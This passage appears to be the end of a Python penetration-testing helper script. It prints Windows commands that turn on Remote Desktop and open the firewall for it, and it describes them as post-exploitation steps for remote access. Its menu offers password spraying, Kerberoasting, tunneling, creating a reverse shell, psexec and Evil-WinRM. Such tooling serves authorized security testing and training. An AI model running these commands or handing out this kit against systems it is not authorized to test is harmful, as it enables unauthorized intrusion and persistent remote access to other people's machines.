reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
net stop termservice && net start termservice
    ''')
    print("\nThese commands will:")
    print("1. Disable the registry setting that blocks RDP (fDenyTSConnections set to 0)")
    print("2. Enable the firewall rule group for 'Remote Desktop'")
    print("3. Restart the terminal service to apply changes\n")

    # PowerShell commands for firewall and RDP configuration
    print("### Enabling RDP and Configuring Firewall via PowerShell ###")
    print('''Commands:
Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\\' -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
Set-NetFirewallRule -DisplayGroup "Remote Desktop" -Profile Any
    ''')
    print("\nThese PowerShell commands will:")
    print("1. Modify the registry to allow RDP connections")
    print("2. Enable the firewall rule for 'Remote Desktop'")
    print("3. Configure the firewall to allow connections on any profile\n")

    print("### Important Notes: ###")
    print("- Ensure you have the necessary privileges to run these commands.")
    print("- Disabling the firewall and enabling RDP could expose the machine to risks if not properly secured.")
    print("- You can use these commands as part of post-exploitation to establish remote access through RDP.\n")


# Main function
def main():
    print("Choose an option:")
    print("1. LDAP Search")
    print("2. Windap Search")
    print("3. GetUserSPNs (Impacket)")
    print("4. GetNPUsers (Impacket)")
    print("5. RPC Anonymous Connect")
    print("6. SMB Anonymous Listing")
    print("7. NBTSCan")
    print("8. Nikto Scan")
    print("9. Nmap Scan")
    print("10. SMBMap Scan")
    print("11. Run BloodHound Python Script")
    print("12. Kerbrute Password Spray")
    print("13. CrackMapExec Password Spray")
    print("14. Kerbrute User Enumeration")
    print("15. Setup Ligolo Tunneling")
    print("16. Add Ligolo Port Forwarding Listeners")
    print("17. SNMP Walk")
    print("18. Create Reverse Shell")
    print("19. impacket-psexec")
    print("20. impacket-smbexec")
    print("21. Evil-WinRM")
    print("22. BloodHound Queries")
    print("23. MSSQL/MySQL Connection")
    print("24. Gobuster Directory Brute-Forcing")
    print("25. FFUF Web Fuzzing")
    print("26. Common Web Exploitation Tips")
    print("27. Explain xp_cmdshell Enabling")
    print("28. Create Wordlist with Cewl")
    print("29. RDP and Admin Setup Explanation")  # Added this option for RDP setup

    choice = input("Enter the number of your choice: ")

    if choice == '1':
        ldap_search()
    elif choice == '2':
        windap_search()
    elif choice == '3':
        get_user_spns()
    elif choice == '4':
        get_np_users()
    elif choice == '5':
        rpc_anonymous_connect()
    elif choice == '6':
        smb_anonymous_listing()
    elif choice == '7':
        nbtscan()
    elif choice == '8':
        nikto_scan()
    elif choice == '9':
        nmap_scan()
    elif choice == '10':
        smbmap_scan()
    elif choice == '11':
        bloodhound_python()
    elif choice == '12':
        kerbrute_password_spray()
    elif choice == '13':
        crackmapexec_password_spray()
    elif choice == '14':
        kerbrute_user_enum()
    elif choice == '15':
        ligolo_setup()
    elif choice == '16':
        ligolo_listeners()
    elif choice == '17':
        snmp_walk()
    elif choice == '18':
        create_reverse_shell()
    elif choice == '19':
        impacket_psexec()
    elif choice == '20':
        impacket_smbexec()
    elif choice == '21':
        evil_winrm()
    elif choice == '22':
        bloodhound_queries()
    elif choice == '23':
        db_connection()
    elif choice == '24':
        gobuster()
    elif choice == '25':
        ffuf()
    elif choice == '26':
        web_exploit_tips()
    elif choice == '27':
        explain_xp_cmdshell_enabling()
    elif choice == '28':
        create_wordlist_with_cewl()
    elif choice == '29':
        explain_rdp_and_admin_setup()  # New function for RDP/Admin setup explanation
    else:
        print("Invalid choice. Please choose a valid option.")

if __name__ == "__main__":
    main()

